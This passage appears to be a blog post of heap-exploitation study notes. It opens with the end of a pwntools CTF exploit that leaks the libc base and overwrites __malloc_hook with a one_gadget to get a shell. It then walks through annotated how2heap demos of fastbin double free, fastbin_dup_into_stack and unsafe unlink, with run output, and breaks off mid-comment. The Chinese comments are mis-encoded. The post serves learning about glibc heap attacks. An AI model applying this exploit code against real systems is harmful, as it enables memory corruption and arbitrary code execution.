class="hljs-comment">#0</span><br>allo(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#1</span><br>allo(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#2</span><br>allo(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#3</span><br>allo(<span class="hljs-number">0x80</span>)<span class="hljs-comment">#4</span><br><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x21</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x21</span>)<br>payload += p8(<span class="hljs-number">0x80</span>)<br>fill(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(payload),payload)<br><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x21</span>)<br>fill(<span class="hljs-number">3</span>,<span class="hljs-built_in">len</span>(payload),payload)<br><br>allo(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#1 The original position of 2</span><br>allo(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#2 4 Simultaneous pointing</span><br><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x91</span>)<br>fill(<span class="hljs-number">3</span>,<span class="hljs-built_in">len</span>(payload),payload)<br><br>allo(<span class="hljs-number">0x80</span>)<br><br>free(<span class="hljs-number">4</span>)<br><br>dump(<span class="hljs-number">2</span>)<br>content = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:]+<span class="hljs-string">&#x27;\x00\x00&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(content))<br>libc_base = (content) - <span class="hljs-number">0x3c4b78</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br><br>allo(<span class="hljs-number">0x60</span>)<br><br>free(<span class="hljs-number">4</span>)<br>payload = p64(libc_base + <span class="hljs-number">0x3C4AED</span>)<br>fill(<span class="hljs-number">2</span>,<span class="hljs-built_in">len</span>(payload),payload)<br><br>allo(<span class="hljs-number">0x60</span>)<br>allo(<span class="hljs-number">0x60</span>)<br>gdb.attach(p)<br>pause()<br><br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x8</span>+<span class="hljs-number">0x2</span>+<span class="hljs-number">0x8</span>+<span class="hljs-number">1</span>)<br>payload += p64(libc_base+<span class="hljs-number">0x4526a</span>)<br><br>fill(<span class="hljs-number">6</span>,<span class="hljs-built_in">len</span>(payload),payload)<br><br>allo(<span class="hljs-number">79</span>)<br><span class="hljs-comment"># gdb.attach(p)</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br><br><span class="hljs-comment">// reference: https://valsamaras.medium.com/the-toddlers-introduction-to-heap-exploitation-fastbin-dup-consolidate-part-4-2-ce6d68136aa8</span><br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This is a powerful technique that bypasses the double free check in tcachebin.&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Fill up the tcache list to force the fastbin usage...\n&quot;</span>);<br><br><br><br><span class="hljs-type">void</span>* p1 = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>,<span class="hljs-number">0x40</span>);<span class="hljs-comment">// åˆ†é…ä¸€ä¸ªå¤§å°ä¸º0x40çš„å †å—</span><br><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Allocate another chunk of the same size p1=%p \n&quot;</span>, p1);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Freeing p1 will add this chunk to the fastbin list...\n\n&quot;</span>);<br><br><span class="hljs-built_in">free</span>(p1);<br><br><br><span class="hljs-comment">// å†æ¬¡mallocçš„æ—¶å€™ï¼Œä¼šè°ƒç”¨consolidateå‡½æ•°æ¥æ•´ç†fastbinï¼Œç”±äºp1å’Œtop chunkç›¸é‚»ï¼Œç›´æ¥åˆå¹¶</span><br><span class="hljs-type">void</span>* p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Allocating a tcache-sized chunk (p3=%p)\n&quot;</span>, p3);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;will trigger the malloc_consolidate and merge\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;the fastbin chunks into the top chunk, thus\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;p1 and p3 are now pointing to the same chunk !\n\n&quot;</span>);<br><br><br><br>assert(p1 == p3);<br><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Triggering the double free vulnerability!\n\n&quot;</span>);<br><br><span class="hljs-built_in">free</span>(p1);<br><span class="hljs-comment">//æ­¤æ—¶ï¼Œp1æ‰€æŒ‡å‘çš„å®é™…æ˜¯0x400çš„p3å †å—ï¼Œå®é™…ä¸Šé‡Šæ”¾çš„æ˜¯p3å †å—</span><br><br><br><span class="hljs-type">void</span> *p4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<br><br><br><span class="hljs-comment">//p1,p2,p3éƒ½ä¸€æ ·</span><br>assert(p4 == p3);<br><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The double free added the chunk referenced by p1 \n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;to the tcache thus the next similar-size malloc will\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;point to p3: p3=%p, p4=%p\n\n&quot;</span>,p3, p4);<br><br>&#125;<br><br><br>zyy@zyy-virtual-machine:~/pwn/how2heap$ ./fastbin_dup_consolidate<br>This is a powerful technique that bypasses the <span class="hljs-type">double</span> <span class="hljs-built_in">free</span> check in tcachebin.<br>Fill up the tcache <span class="hljs-built_in">list</span> to force the fastbin usage...<br>Allocate another chunk of the same size p1=<span class="hljs-number">0x1a13420</span> <br>Freeing p1 will add this chunk to the fastbin <span class="hljs-built_in">list</span>...<br><br>Allocating a tcache-sized chunk (p3=<span class="hljs-number">0x1a13420</span>)<br>will trigger the malloc_consolidate and merge<br>the fastbin chunks into the top chunk, thus<br>p1 and p3 are now pointing to the same chunk !<br><br>Triggering the <span class="hljs-type">double</span> <span class="hljs-built_in">free</span> vulnerability!<br><br>The <span class="hljs-type">double</span> <span class="hljs-built_in">free</span> added the chunk referenced by p1 <br>to the tcache thus the next similar-size <span class="hljs-built_in">malloc</span> will<br>point to p3: p3=<span class="hljs-number">0x1a13420</span>, p4=<span class="hljs-number">0x1a13420</span><br></code></pre></td></tr></table></figure><h3 id="fastbin-dup-into-stack"><a href="#fastbin-dup-into-stack" class="headerlink" title="fastbin_dup_into_stack"></a>fastbin_dup_into_stack</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// è¯¥æŠ€æœ¯é€šå¸¸ç”¨æ¥å°†å †å—åˆ†é…åœ¨æ ˆä¸Š</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br><br>&#123;<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This file extends on fastbin_dup.c by tricking malloc into\n&quot;</span><br><br>       <span class="hljs-string">&quot;returning a pointer to a controlled location (in this case, the stack).\n&quot;</span>);<br><br><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> stack_var;<br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;The address we want malloc() to return is %p.\n&quot;</span>, <span class="hljs-number">8</span>+(<span class="hljs-type">char</span> *)&amp;stack_var);<br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Allocating 3 buffers.\n&quot;</span>);<br><br><span class="hljs-type">int</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br><br><span class="hljs-type">int</span> *b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br><br><span class="hljs-type">int</span> *c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;1st malloc(8): %p\n&quot;</span>, a);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;2nd malloc(8): %p\n&quot;</span>, b);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;3rd malloc(8): %p\n&quot;</span>, c);<br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Freeing the first one...\n&quot;</span>);<br><br><span class="hljs-built_in">free</span>(a);<br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);<br><br><span class="hljs-comment">// free(a);</span><br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);<br><br><span class="hljs-built_in">free</span>(b);<br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);<br><br><span class="hljs-built_in">free</span>(a);<br><br><br><span class="hljs-comment">// è¿™æ—¶å€™å½¢æˆäº†å †å—aå’Œå †å—bçš„å¾ªç¯é“¾è¡¨</span><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now the free list has [ %p, %p, %p ]. &quot;</span><br><br><span class="hljs-string">&quot;We&#x27;ll now carry out our attack by modifying data at %p.\n&quot;</span>, a, b, a, a);<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> *d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;1st malloc(8): %p\n&quot;</span>, d);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;2nd malloc(8): %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>));<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now the free list has [ %p ].\n&quot;</span>, a);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now, we have access to %p while it remains at the head of the free list.\n&quot;</span><br><br><span class="hljs-string">&quot;so now we are writing a fake free size (in this case, 0x20) to the stack,\n&quot;</span><br><br><span class="hljs-string">&quot;so that malloc will think there is a free chunk there and agree to\n&quot;</span><br><br><span class="hljs-string">&quot;return a pointer to it.\n&quot;</span>, a);<br><br>stack_var = <span class="hljs-number">0x20</span>;<br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n&quot;</span>, a);<br><br>*d = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span>) (((<span class="hljs-type">char</span>*)&amp;stack_var) - <span class="hljs-keyword">sizeof</span>(d));<br><span class="hljs-comment">// éœ€è¦å¯¹å †å—aæœ‰ä¿®æ”¹çš„æƒé™ï¼Œä¿®æ”¹å…¶fdæŒ‡é’ˆåŒºåŸŸ</span><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;3rd malloc(8): %p, putting the stack address on the free list\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>));<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;4th malloc(8): %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>));<br><br>&#125;<br><br><br>zyy@zyy-virtual-machine:~/pwn/how2heap$ ./fastbin_dup_into_stack<br>This file extends on fastbin_dup.c by tricking <span class="hljs-built_in">malloc</span> into<br>returning a pointer to a controlled <span class="hljs-title function_">location</span> <span class="hljs-params">(in this <span class="hljs-keyword">case</span>, the <span class="hljs-built_in">stack</span>)</span>.<br>The address we want <span class="hljs-title function_">malloc</span><span class="hljs-params">()</span> to <span class="hljs-keyword">return</span> is 0x7ffd5d534248.<br>Allocating 3 buffers.<br>1st <span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-number">8</span>)</span>: 0x1ae5010<br>2nd <span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-number">8</span>)</span>: 0x1ae5030<br>3rd <span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-number">8</span>)</span>: 0x1ae5050<br>Freeing the first one...<br>If we <span class="hljs-built_in">free</span> 0x1ae5010 again, things will crash because 0x1ae5010 is at the top of the <span class="hljs-built_in">free</span> <span class="hljs-built_in">list</span>.<br>So, instead, we&#x27;ll <span class="hljs-built_in">free</span> 0x1ae5030.<br>Now, we can <span class="hljs-built_in">free</span> 0x1ae5010 again, since it&#x27;s not the head of the <span class="hljs-built_in">free</span> <span class="hljs-built_in">list</span>.<br>Now the <span class="hljs-built_in">free</span> <span class="hljs-built_in">list</span> has [ 0x1ae5010, 0x1ae5030, 0x1ae5010 ]. We&#x27;ll now carry out our attack by modifying data at 0x1ae5010.<br>1st <span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-number">8</span>)</span>: 0x1ae5010<br>2nd <span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-number">8</span>)</span>: 0x1ae5030<br>Now the <span class="hljs-built_in">free</span> <span class="hljs-built_in">list</span> has [ 0x1ae5010 ].<br>Now, we have access to 0x1ae5010 <span class="hljs-keyword">while</span> it remains at the head of the <span class="hljs-built_in">free</span> <span class="hljs-built_in">list</span>.<br>so now we are writing a fake <span class="hljs-built_in">free</span> <span class="hljs-title function_">size</span> <span class="hljs-params">(in this <span class="hljs-keyword">case</span>, <span class="hljs-number">0x20</span>)</span> to the <span class="hljs-built_in">stack</span>,<br>so that <span class="hljs-built_in">malloc</span> will think there is a <span class="hljs-built_in">free</span> chunk there and agree to<br><span class="hljs-keyword">return</span> a pointer to it.<br>Now, we overwrite the first 8 bytes of the data at 0x1ae5010 to point right before the 0x20.<br>3rd <span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-number">8</span>)</span>: 0x1ae5010, putting the <span class="hljs-built_in">stack</span> address on the <span class="hljs-built_in">free</span> <span class="hljs-built_in">list</span><br>4th <span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-number">8</span>)</span>: 0x7ffd5d534248<br></code></pre></td></tr></table></figure><h2 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// ä½¿ç”¨unlinkå®ç°ä»»æ„åœ°å€å†™ï¼Œæƒ³è¦æ·±åˆ»ç†è§£è¿˜æ˜¯éœ€è¦å¯¹cè¯­è¨€çš„æŒ‡é’ˆæ“ä½œå’Œé“¾è¡¨æ“ä½œæœ‰ä¸€å®šçš„è®¤è¯†</span><br><span class="hljs-comment">// å¾ˆé‡è¦çš„ä¸€ç‚¹æ˜¯éœ€è¦ä¸€ä¸ªå…¨å±€å˜é‡æ¥å­˜å‚¨mallocå¾—åˆ°çš„æŒ‡é’ˆ</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><br><br><span class="hljs-type">uint64_t</span> *chunk0_ptr;<br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br><br>&#123;<br><br>setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome to unsafe unlink 2.0!\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Tested in Ubuntu 14.04/16.04 64bit.\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n&quot;</span>);<br><span class="hljs-comment">// éœ€è¦ä¸€ä¸ªå…¨å±€å˜é‡</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n&quot;</span>);<br><br><br><span class="hljs-comment">// unlinkçš„å‰ææ˜¯ä¸ä½¿ç”¨fastbin</span><br><span class="hljs-type">int</span> malloc_size = <span class="hljs-number">0x80</span>; <span class="hljs-comment">//we want to be big enough not to use fastbins</span><br><br><span class="hljs-type">int</span> header_size = <span class="hljs-number">2</span>;<br><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n&quot;</span>);<br><br><br><br>chunk0_ptr = (<span class="hljs-type">uint64_t</span>*) <span class="hljs-built_in">malloc</span>(malloc_size); <span class="hljs-comment">//chunk0</span><br><br><span class="hljs-type">uint64_t</span> *chunk1_ptr  = (<span class="hljs-type">uint64_t</span>*) <span class="hljs-built_in">malloc</span>(malloc_size); <span class="hljs-comment">//chunk1</span><br><span class="hljs-comment">// æ³¨æ„ptr0çš„æŒ‡é’ˆæ‰€åœ¨çš„åœ°å€å’Œå…¶æœ¬èº«çš„å€¼</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The global chunk0_ptr is at %p, pointing to %p\n&quot;</span>, &amp;chunk0_ptr, chunk0_ptr);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The victim chunk we are going to corrupt is at %p\n\n&quot;</span>, chunk1_ptr);<br><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We create a fake chunk inside chunk0.\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We setup the &#x27;next_free_chunk&#x27; (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n&quot;</span>);<br><span class="hljs-comment">// è¿™é‡Œæ˜¯ä¿®æ”¹fake_chunkçš„fdæŒ‡é’ˆæ¥ç»•è¿‡p-&gt;fd-&gt;bk = pçš„æ£€æŸ¥ï¼Œæ³¨æ„è¿™é‡Œæ˜¯ptr0æŒ‡é’ˆçš„åœ°å€å‡å»å¯¹åº”çš„å€¼</span><br>chunk0_ptr[<span class="hljs-number">2</span>] = (<span class="hljs-type">uint64_t</span>) &amp;chunk0_ptr-(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>)*<span class="hljs-number">3</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We setup the &#x27;previous_free_chunk&#x27; (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n&quot;</span>);<br><span class="hljs-comment">// è¿™é‡Œæ˜¯ä¿®æ”¹fake_chunkçš„bkæŒ‡é’ˆæ¥ç»•è¿‡p-&gt;bk-&gt;fd = 